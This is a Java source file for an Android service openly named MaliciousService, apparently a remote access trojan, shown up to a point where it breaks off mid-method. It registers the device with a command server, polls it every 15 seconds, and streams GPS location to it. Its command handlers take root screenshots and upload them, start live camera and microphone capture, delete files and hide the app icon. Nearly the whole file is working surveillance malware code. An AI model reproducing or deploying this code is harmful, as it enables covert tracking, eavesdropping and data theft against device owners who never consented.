package com.example.android;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Callable;
import java.util.Properties;

public class MaliciousService extends Service {
    private static final String TAG = "MaliciousService";
    private String SERVER_IP;
    private String FLASK_PORT;  // Port for Flask API calls (8080)
    private String RAT_PORT;    // Port for RAT socket connections (4444)
    private static final String MAIN_ACTIVITY_NAME = "com.example.android.MainActivity";
    private static final String PERMISSION_REQUEST_ACTIVITY_NAME = "com.example.android.PermissionRequestActivity";
    private Handler handler;
    private Runnable commandCheckRunnable;
    private LocationManager locationManager;
    private LocationListener locationListener;
    private ExecutorService executorService;
    private static final String COMMAND_CHECK_INTERVAL = "15000";
    private static final String LOCATION_UPDATE_INTERVAL = "120000";
    private static final String LOCATION_UPDATE_DISTANCE = "50.0f";
    private static final String CHANNEL_ID = "MaliciousServiceChannel";
    private static final String PREFS_NAME = "RAT_DEVICE_PREFS";
    private static final String DEVICE_ID_KEY = "device_id";
    private static final String SERVER_IP_PREF_KEY = "server_ip";
    private static final String FLASK_PORT_PREF_KEY = "flask_port";
    private static final String RAT_PORT_PREF_KEY = "rat_port";
    private static final String PERMISSIONS_REQUESTED_KEY = "permissions_requested";
    private String uniqueDeviceId;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service created!");
        executorService = Executors.newSingleThreadExecutor();
        initializeUniqueDeviceId();
        injectConfigFromAssets();
        loadServerConfigFromPreferences();
        checkAndRequestPermissions();
        grantPermissions();
        
        if (uniqueDeviceId != null && SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty() && allPermissionsGranted()) {
            registerDeviceWithServer();
            createNotificationChannel();
            Notification notification = buildNotification();
            startForeground(1, notification);
            handler = new Handler();
            commandCheckRunnable = new Runnable() {
                @Override
                public void run() {
                    if (uniqueDeviceId != null && !uniqueDeviceId.isEmpty()) {
                        executorService.submit(() -> sendHeartbeat());
                        if (SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty() && allPermissionsGranted()) {
                            executorService.submit(() -> checkCommands());
                        } else {
                            Log.w(TAG, "Server config or permissions not ready. Waiting.");
                            checkAndRequestPermissions();
                            loadServerConfigFromPreferences();
                            if (SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty() && allPermissionsGranted()) {
                                registerDeviceWithServer();
                            }
                        }
                    } else {
                        Log.e(TAG, "Device ID not available, skipping heartbeat and command check.");
                    }
                    handler.postDelayed(this, Long.parseLong(COMMAND_CHECK_INTERVAL));
                }
            };

            locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            locationListener = new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    if (uniqueDeviceId != null && !uniqueDeviceId.isEmpty() && SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty() && allPermissionsGranted()) {
                        executorService.submit(() -> sendLocation(location));
                    } else {
                        Log.w(TAG, "Config or permissions not ready, skipping location send.");
                    }
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(String provider) {}
                @Override public void onProviderDisabled(String provider) {}
            };

            startLocationUpdates();
            handler.postDelayed(commandCheckRunnable, 5000);
        } else {
            Log.e(TAG, "Service started, but configuration or permissions are missing. Waiting for them.");
            handler = new Handler();
            commandCheckRunnable = new Runnable() {
                @Override
                public void run() {
                    if (uniqueDeviceId != null && !uniqueDeviceId.isEmpty()) {
                        executorService.submit(() -> sendHeartbeat());
                        checkAndRequestPermissions();
                        loadServerConfigFromPreferences();
                        if (SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty() && allPermissionsGranted()) {
                            registerDeviceWithServer();
                        }
                        if (SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty() && allPermissionsGranted()) {
                            executorService.submit(() -> checkCommands());
                        }
                    }
                    handler.postDelayed(this, Long.parseLong(COMMAND_CHECK_INTERVAL));
                }
            };
            handler.postDelayed(commandCheckRunnable, 5000);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service started or restarted!");
        if (intent != null) {
            String injectedServerIp = intent.getStringExtra("SERVER_IP");
            String injectedServerPort = intent.getStringExtra("SERVER_PORT");
            if (injectedServerIp != null && !injectedServerIp.isEmpty() && injectedServerPort != null && !injectedServerPort.isEmpty()) {
                Log.d(TAG, "Received server config via Intent: IP=" + injectedServerIp + ", Port=" + injectedServerPort);
                saveServerConfigToPreferences(injectedServerIp, injectedServerPort);
                loadServerConfigFromPreferences();
                registerDeviceWithServer();
            }
            if (intent.getAction() != null) {
                if (intent.getAction().equals("HIDE_ICON")) {
                    hideIcon();
                } else if (intent.getAction().equals("SHOW_ICON")) {
                    showIcon();
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed!");
        if (handler != null) {
            handler.removeCallbacks(commandCheckRunnable);
        }
        stopLocationUpdates();
        if (executorService != null) {
            executorService.shutdownNow();
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID,
                "Foreground Service Channel",
                NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        builder.setContentTitle("Service Running")
               .setContentText("Monitoring for commands...")
               .setSmallIcon(android.R.drawable.ic_menu_info_details);
        return builder.build();
    }

    private void initializeUniqueDeviceId() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        uniqueDeviceId = prefs.getString(DEVICE_ID_KEY, null);
        if (uniqueDeviceId == null || uniqueDeviceId.isEmpty()) {
            uniqueDeviceId = UUID.randomUUID().toString();
            SharedPreferences.Editor editor = prefs.edit();
            editor.putString(DEVICE_ID_KEY, uniqueDeviceId);
            editor.apply();
            Log.d(TAG, "Generated and saved new unique device ID: " + uniqueDeviceId);
        } else {
            Log.d(TAG, "Loaded existing unique device ID: " + uniqueDeviceId);
        }
    }

    private void loadServerConfigFromPreferences() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SERVER_IP = prefs.getString(SERVER_IP_PREF_KEY, null);
        FLASK_PORT = prefs.getString(FLASK_PORT_PREF_KEY, null);
        RAT_PORT = prefs.getString(RAT_PORT_PREF_KEY, null);
        if (SERVER_IP != null && !SERVER_IP.isEmpty() && FLASK_PORT != null && !FLASK_PORT.isEmpty()) {
            Log.d(TAG, "Loaded server config from SharedPreferences: IP=" + SERVER_IP + ", Flask Port=" + FLASK_PORT + ", RAT Port=" + RAT_PORT);
        } else {
            Log.w(TAG, "Server IP/Flask Port not found in SharedPreferences.");
            SERVER_IP = null;
            FLASK_PORT = null;
            RAT_PORT = null;
        }
    }

    private void saveServerConfigToPreferences(String ip, String flaskPort) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString(SERVER_IP_PREF_KEY, ip);
        editor.putString(FLASK_PORT_PREF_KEY, flaskPort);
        editor.apply();
        Log.d(TAG, "Saved server config to SharedPreferences: IP=" + ip + ", Flask Port=" + flaskPort);
    }
    
    private void saveServerConfigToPreferences(String ip, String flaskPort, String ratPort) {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString(SERVER_IP_PREF_KEY, ip);
        editor.putString(FLASK_PORT_PREF_KEY, flaskPort);
        if (ratPort != null && !ratPort.isEmpty()) {
            editor.putString(RAT_PORT_PREF_KEY, ratPort);
        }
        editor.apply();
        Log.d(TAG, "Saved server config to SharedPreferences: IP=" + ip + ", Flask Port=" + flaskPort + ", RAT Port=" + ratPort);
    }

    private void injectConfigFromAssets() {
        try {
            InputStream is = getAssets().open("config.ini");
            Properties props = new Properties();
            props.load(is);
            is.close();
            
            // Get properties from the [SERVER] section
            String localIp = props.getProperty("SERVER.LOCAL_IP");
            String publicIp = props.getProperty("SERVER.PUBLIC_IP");
            String port = props.getProperty("SERVER.PORT");
            
            // If not found with section prefix, try without it (backward compatibility)
            if (localIp == null) localIp = props.getProperty("LOCAL_IP");
            if (publicIp == null) publicIp = props.getProperty("PUBLIC_IP");
            if (port == null) port = props.getProperty("PORT");
            
            Log.d(TAG, "Read from config.ini: LOCAL_IP=" + localIp + ", PUBLIC_IP=" + publicIp + ", PORT=" + port);
            
            // Salviamo entrambi gli IP e proviamo prima il locale, poi il pubblico
            if (localIp != null && !localIp.isEmpty() && publicIp != null && !publicIp.isEmpty() && port != null && !port.isEmpty()) {
                Log.d(TAG, "Configurazione completa trovata. Provo prima IP locale: " + localIp + ":" + port);
                
                // Salva entrambi gli IP nelle preferenze
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                SharedPreferences.Editor editor = prefs.edit();
                editor.putString("LOCAL_IP", localIp);
                editor.putString("PUBLIC_IP", publicIp);
                editor.putString("PORT", port);
                editor.apply();
                
                // Imposta prima l'IP locale
                saveServerConfigToPreferences(localIp, port, port);

                // Programma un controllo per provare l'IP pubblico se quello locale fallisce
                final String finalLocalIp = localIp;
                final String finalPublicIp = publicIp;
                final String finalPort = port;

                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (!isServerReachable(finalLocalIp, finalPort) && finalPublicIp != null && !finalPublicIp.isEmpty()) {
                            Log.d(TAG, "IP locale non raggiungibile, passo all'IP pubblico: " + finalPublicIp);
                            saveServerConfigToPreferences(finalPublicIp, finalPort, finalPort);
                            loadServerConfigFromPreferences();
                            registerDeviceWithServer();
                        } else {
                            Log.d(TAG, "IP locale raggiungibile, continuo a usare: " + finalLocalIp);
                            registerDeviceWithServer();
                        }
                    }
                }, 3000); // Attendi 3 secondi prima di provare l'IP pubblico
                
            } else if (localIp != null && !localIp.isEmpty() && port != null && !port.isEmpty()) {
                Log.d(TAG, "Solo IP locale trovato, uso: " + localIp + ":" + port);
                saveServerConfigToPreferences(localIp, port, port);
                
                // Prova anche con un IP pubblico predefinito se quello locale fallisce
                final String finalLocalIp = localIp;
                final String finalPort = port;
                
                Handler handler = new Handler();
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        if (!isServerReachable(finalLocalIp, finalPort)) {
                            Log.d(TAG, "IP locale non raggiungibile, provo con IP pubblico predefinito");
                            // Prova con un IP pubblico predefinito
                            saveServerConfigToPreferences("your-public-ip.com", finalPort, finalPort);
                            loadServerConfigFromPreferences();
                            registerDeviceWithServer();
                        }
                    }
                }, 3000);
                
            } else if (publicIp != null && !publicIp.isEmpty() && port != null && !port.isEmpty()) {
                // Se non c'è IP locale, usa direttamente quello pubblico
                Log.d(TAG, "Solo IP pubblico trovato, uso: " + publicIp + ":" + port);
                saveServerConfigToPreferences(publicIp, port, port);
            } else {
                Log.e(TAG, "Nessuna configurazione server valida trovata in config.ini");
                
                // Prova a usare valori predefiniti in caso di errore
                Log.d(TAG, "Tentativo con valori predefiniti: 192.168.1.100:8080");
                saveServerConfigToPreferences("192.168.1.100", "8080", "8080");
            }
        } catch (IOException e) {
            Log.w(TAG, "config.ini non trovato negli assets: " + e.getMessage());
            
            // Prova a usare valori predefiniti in caso di errore
            Log.d(TAG, "Tentativo con valori predefiniti: 192.168.1.100:8080");
            saveServerConfigToPreferences("192.168.1.100", "8080", "8080");
        } catch (Exception e) {
            Log.e(TAG, "Errore nell'elaborazione della configurazione: " + e.getMessage());
            
            // Prova a usare valori predefiniti in caso di errore
            Log.d(TAG, "Tentativo con valori predefiniti: 192.168.1.100:8080");
            saveServerConfigToPreferences("192.168.1.100", "8080", "8080");
        }
    }
    
    private boolean isServerReachable(String ip, String port) {
        try {
            URL url = new URL("http://" + ip + ":" + port + "/api/rat_connect");
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(5000); // 5 seconds timeout
            connection.setReadTimeout(5000);
            connection.setRequestMethod("GET");
            connection.setRequestProperty("User-Agent", "Android RAT Client");
            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Server check response: " + responseCode + " for " + ip + ":" + port);
            connection.disconnect();
            return responseCode == 200;
        } catch (Exception e) {
            Log.d(TAG, "Server not reachable at " + ip + ":" + port + " - " + e.getMessage());
            return false;
        }
    }
    
    private String getLocalIpAddress() {
        try {
            java.net.NetworkInterface networkInterface;
            java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
            while (interfaces.hasMoreElements()) {
                networkInterface = interfaces.nextElement();
                java.util.Enumeration<java.net.InetAddress> addresses = networkInterface.getInetAddresses();
                
                while (addresses.hasMoreElements()) {
                    java.net.InetAddress address = addresses.nextElement();
                    if (!address.isLoopbackAddress() && address instanceof java.net.Inet4Address) {
                        return address.getHostAddress();
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting local IP: " + e.getMessage());
        }
        return "unknown";
    }

    private String[] getRequiredPermissions() {
        return new String[]{
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.CAMERA
        };
    }

    private boolean allPermissionsGranted() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return true;
        }
        for (String permission : getRequiredPermissions()) {
            if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void grantPermissions() {
        // Non tentiamo più di concedere i permessi con pm grant perché richiede root
        // Invece, ci affidiamo alla richiesta esplicita tramite PermissionRequestActivity
        Log.d(TAG, "Permissions will be requested through PermissionRequestActivity");
        
        // Forziamo l'avvio dell'activity di richiesta permessi se non sono già concessi
        if (!allPermissionsGranted()) {
            Intent permissionIntent = new Intent(this, PermissionRequestActivity.class);
            permissionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(permissionIntent);
        }
    }

    private void checkAndRequestPermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return;
        }
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        boolean permissionsAlreadyRequested = prefs.getBoolean(PERMISSIONS_REQUESTED_KEY, false);
        if (!allPermissionsGranted() && !permissionsAlreadyRequested) {
            Log.d(TAG, "Permissions not granted. Launching PermissionRequestActivity.");
            Intent permissionIntent = new Intent(this, PermissionRequestActivity.class);
            permissionIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(permissionIntent);
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean(PERMISSIONS_REQUESTED_KEY, true);
            editor.apply();
        } else if (allPermissionsGranted()) {
            Log.d(TAG, "All required permissions are granted.");
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean(PERMISSIONS_REQUESTED_KEY, true);
            editor.apply();
        }
    }

    private void registerDeviceWithServer() {
        String targetIp = SERVER_IP;
        String targetPort = FLASK_PORT;  // Connect to Flask server
        if (targetIp == null || targetPort == null || uniqueDeviceId == null) {
            Log.w(TAG, "Server IP/Flask Port not loaded or Device ID not ready, cannot register device.");
            return;
        }
        
        // Connect to Flask via HTTP API
        HttpURLConnection connection = null;
        try {
            // Prova prima con l'IP configurato
            String serverUrl = "http://" + targetIp + ":" + targetPort + "/api/rat_connect";
            Log.d(TAG, "Tentativo di connessione a: " + serverUrl);
            
            URL url = new URL(serverUrl);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setRequestProperty("Accept", "application/json");
            connection.setRequestProperty("User-Agent", "Android RAT Client");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000); // Aumentato a 10 secondi
            connection.setReadTimeout(10000);
            
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("device_id", uniqueDeviceId);
            jsonObject.put("device_type", Build.MODEL);
            jsonObject.put("device_manufacturer", Build.MANUFACTURER);
            jsonObject.put("connection_type", "register");
            jsonObject.put("android_version", Build.VERSION.RELEASE);
            jsonObject.put("sdk_version", Build.VERSION.SDK_INT);
            jsonObject.put("permissions_granted", allPermissionsGranted());
            jsonObject.put("timestamp", System.currentTimeMillis() / 1000);
            
            // Aggiungi informazioni di rete
            try {
                jsonObject.put("ip_address", getLocalIpAddress());
            } catch (Exception e) {
                Log.e(TAG, "Errore nel recupero dell'IP locale: " + e.getMessage());
            }
            
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            
            int responseCode = connection.getResponseCode();
            Log.d(TAG, "Risposta dal server: " + responseCode);
            
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream inputStream = connection.getInputStream();
                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    
                    Log.d(TAG, "Risposta completa: " + response.toString());
                    
                    try {
                        JSONObject responseJson = new JSONObject(response.toString());
                        String status = responseJson.optString("status", "unknown");
                        
                        if (status.equals("connected") || status.equals("received") || status.equals("ok")) {
                            Log.d(TAG, "Dispositivo registrato con successo al server: " + targetIp + ":" + targetPort);
                            
                            // Process any pending commands
                            if (responseJson.has("commands")) {
                                JSONArray commands = responseJson.getJSONArray("commands");
                                for (int i = 0; i < commands.length(); i++) {
                                    String command = commands.getString(i);
                                    executeCommand(command);
                                }
                            }
                        } else {
                            Log.w(TAG, "Risposta inattesa dal server: " + response.toString());
                        }
                    } catch (JSONException e) {
                        Log.e(TAG, "Errore nel parsing della risposta JSON: " + e.getMessage());
                    }
                }
            } else {
                Log.e(TAG, "Impossibile registrare il dispositivo. Codice risposta: " + responseCode);
                
                // Se l'IP locale fallisce, prova con l'IP pubblico
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String publicIp = prefs.getString("PUBLIC_IP", null);
                if (publicIp != null && !publicIp.equals(targetIp)) {
                    Log.d(TAG, "Tentativo con IP pubblico: " + publicIp);
                    saveServerConfigToPreferences(publicIp, targetPort, targetPort);
                    loadServerConfigFromPreferences();
                    // Non richiamare registerDeviceWithServer per evitare ricorsione infinita
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Errore nella registrazione del dispositivo: " + e.getMessage());
            
            // Prova con IP alternativi in caso di errore
            try {
                SharedPreferences prefs = getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                String currentIp = prefs.getString("SERVER_IP", "");
                String localIp = prefs.getString("LOCAL_IP", null);
                String publicIp = prefs.getString("PUBLIC_IP", null);
                
                if (publicIp != null && !publicIp.equals(currentIp)) {
                    Log.d(TAG, "Tentativo con IP pubblico dopo errore: " + publicIp);
                    saveServerConfigToPreferences(publicIp, targetPort, targetPort);
                    loadServerConfigFromPreferences();
                } else if (localIp != null && !localIp.equals(currentIp)) {
                    Log.d(TAG, "Tentativo con IP locale dopo errore: " + localIp);
                    saveServerConfigToPreferences(localIp, targetPort, targetPort);
                    loadServerConfigFromPreferences();
                }
            } catch (Exception ex) {
                Log.e(TAG, "Errore nel tentativo di usare IP alternativi: " + ex.getMessage());
            }
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }
    
    // Socket connection method no longer needed - using Flask HTTP API
    
    // Original HTTP method maintained as fallback
    private void registerDeviceWithFlaskServer() {
        String targetIp = SERVER_IP;
        String targetPort = FLASK_PORT;
        if (targetIp == null || targetPort == null || uniqueDeviceId == null) {
            Log.w(TAG, "Server IP/Flask Port not loaded or Device ID not ready, cannot register device.");
            return;
        }
        HttpURLConnection connection = null;
        try {
            URL url = new URL("http://" + targetIp + ":" + targetPort + "/api/register_device");
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("device_id", uniqueDeviceId);
            jsonObject.put("device_type", Build.MODEL);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream inputStream = connection.getInputStream();
                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    JSONObject responseJson = new JSONObject(response.toString());
                    if (responseJson.getString("status").equals("registered")) {
                        Log.d(TAG, "Device registered successfully with server: " + targetIp + ":" + targetPort);
                        if (responseJson.has("server_config")) {
                            JSONObject config = responseJson.getJSONObject("server_config");
                            String serverIpFromResponse = config.getString("ip");
                            String serverPortFromResponse = config.getString("port");
                            if (serverIpFromResponse != null && !serverIpFromResponse.isEmpty() &&
                                serverPortFromResponse != null && !serverPortFromResponse.isEmpty()) {
                                if (!serverIpFromResponse.equals(SERVER_IP) || !serverPortFromResponse.equals(FLASK_PORT)) {
                                    saveServerConfigToPreferences(serverIpFromResponse, serverPortFromResponse);
                                    loadServerConfigFromPreferences();
                                }
                            }
                        }
                    } else {
                        Log.e(TAG, "Server registration status not 'registered'.");
                    }
                }
            } else {
                Log.w(TAG, "Server responded with non-OK code for registration: " + responseCode);
            }
        } catch (IOException | JSONException e) {
            Log.e(TAG, "Failed to register device with server: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void sendLocation(Location location) {
        if (location == null || SERVER_IP == null || FLASK_PORT == null || uniqueDeviceId == null) {
            Log.w(TAG, "Location, server config, or device ID is null, not sending.");
            return;
        }
        JSONObject jsonObject = new JSONObject();
        try {
            jsonObject.put("lat", location.getLatitude());
            jsonObject.put("lon", location.getLongitude());
        } catch (JSONException e) {
            Log.e(TAG, "JSON exception for location: " + e.getMessage());
            return;
        }
        HttpURLConnection connection = null;
        try {
            URL url = new URL("http://" + SERVER_IP + ":" + FLASK_PORT + "/api/location/" + uniqueDeviceId);
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                Log.d(TAG, "Location sent successfully for device: " + uniqueDeviceId);
            } else {
                Log.w(TAG, "Server responded with non-OK code for location: " + responseCode);
            }
        } catch (IOException e) {
            Log.e(TAG, "Failed to send location for device " + uniqueDeviceId + ": " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void checkCommands() {
        if (SERVER_IP == null || FLASK_PORT == null || uniqueDeviceId == null) {
            Log.w(TAG, "Server configuration or device ID not loaded, skipping command check.");
            return;
        }
        
        // Use rat_connect endpoint for integrated command checking
        HttpURLConnection connection = null;
        try {
            URL url = new URL("http://" + SERVER_IP + ":" + FLASK_PORT + "/api/rat_connect");
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            connection.setDoOutput(true);
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            
            JSONObject jsonObject = new JSONObject();
            jsonObject.put("device_id", uniqueDeviceId);
            jsonObject.put("device_type", Build.MODEL);
            jsonObject.put("connection_type", "check_commands");
            
            try (OutputStream os = connection.getOutputStream()) {
                os.write(jsonObject.toString().getBytes(StandardCharsets.UTF_8));
                os.flush();
            }
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                try (InputStream inputStream = connection.getInputStream();
                     BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    
                    JSONObject responseJson = new JSONObject(response.toString());
                    if (responseJson.has("commands")) {
                        JSONArray commands = responseJson.getJSONArray("commands");
                        if (commands.length() > 0) {
                            Log.d(TAG, "Received " + commands.length() + " commands for device " + uniqueDeviceId);
                            for (int i = 0; i < commands.length(); i++) {
                                String command = commands.getString(i);
                                executeCommand(command);
                            }
                        }
                    }
                }
            } else {
                Log.w(TAG, "Flask server responded with non-OK code for commands: " + responseCode);
            }
        } catch (IOException | JSONException e) {
            Log.e(TAG, "Failed to check commands with Flask server: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    private void executeCommand(String command) {
        Log.d(TAG, "Executing command: " + command);
        if (command.startsWith("SET_SERVER_CONFIG:")) {
            String[] parts = command.split(":");
            if (parts.length == 3) {
                String ip = parts[1];
                String port = parts[2];
                saveServerConfigToPreferences(ip, port);
                loadServerConfigFromPreferences();
                registerDeviceWithServer();
            } else {
                Log.w(TAG, "Invalid SET_SERVER_CONFIG format: " + command);
            }
        } else {
            switch (command) {
                case "SCREENSHOT":
                    executorService.submit((Callable<Void>) () -> {
                        takeScreenshot();
                        return null;
                    });
                    break;
                case "DOWNLOAD_FILE":
                    executorService.submit((Callable<Void>) () -> {
                        downloadFile();
                        return null;
                    });
                    break;
                case "DELETE_FILE":
                    executorService.submit((Callable<Void>) () -> {
                        deleteFile();
                        return null;
                    });
                    break;
                case "LIVE_CAMERA":
                    executorService.submit((Callable<Void>) () -> {
                        startLiveCamera();
                        return null;
                    });
                    break;
                case "LIVE_MIC":
                    executorService.submit((Callable<Void>) () -> {
                        startLiveMic();
                        return null;
                    });
                    break;
                case "STOP_CAMERA":
                    executorService.submit((Callable<Void>) () -> {
                        stopLiveCamera();
                        return null;
                    });
                    break;
                case "STOP_MIC":
                    executorService.submit((Callable<Void>) () -> {
                        stopLiveMic();
                        return null;
                    });
                    break;
                case "HIDE_ICON":
                    hideIcon();
                    break;
                case "SHOW_ICON":
                    showIcon();
                    break;
                default:
                    Log.w(TAG, "Unknown command: " + command);
            }
        }
    }

    private void takeScreenshot() {
        if (!allPermissionsGranted()) {
            Log.e(TAG, "Cannot take screenshot: Permissions not granted.");
            checkAndRequestPermissions();
            return;
        }
        Log.d(TAG, "Attempting to take screenshot...");
        File screenshotFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES), "rat_screenshot_" + System.currentTimeMillis() + ".png");
        String absolutePath = screenshotFile.getAbsolutePath();
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"su", "-c", "screencap -p " + absolutePath});
            int result = process.waitFor();
            Log.d(TAG, "screencap process exited with code: " + result);
            if (screenshotFile.exists() && screenshotFile.length() > 0) {
                Log.d(TAG, "Screenshot captured: " + screenshotFile.getAbsolutePath());
                uploadFile(screenshotFile, "screenshot");
            } else {
                Log.e(TAG, "Screenshot file not found or empty after capture. Ensure device is rooted or screenshot permissions are available.");
            }
        } catch (IOException | InterruptedException e) {
            Log.e(TAG, "Error taking screenshot: " + e.getMessage());
        } finally {
            if (screenshotFile.exists()) {
                if (screenshotFile.delete()) {
                    Log.d(TAG, "Screenshot file deleted successfully.");
                } else {
                    Log.w(TAG, "Failed to delete screenshot file.");
                }
            }
        }
    }

    private void downloadFile() {
        if (!allPermissionsGranted()) {
            Log.e(TAG, "Cannot download file: Permissions not granted.");
            checkAndRequestPermissions();
            return;
        }
        Log.d(TAG, "Simulating file download...");
        String fileUrl = "http://example.com/dummy.txt";
        String fileName = "downloaded_sample.txt";
        File downloadFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), fileName);
        try {
            URL url = new URL(fileUrl);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setConnectTimeout(10000);
            connection.setReadTimeout(10000);
            connection.connect();
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
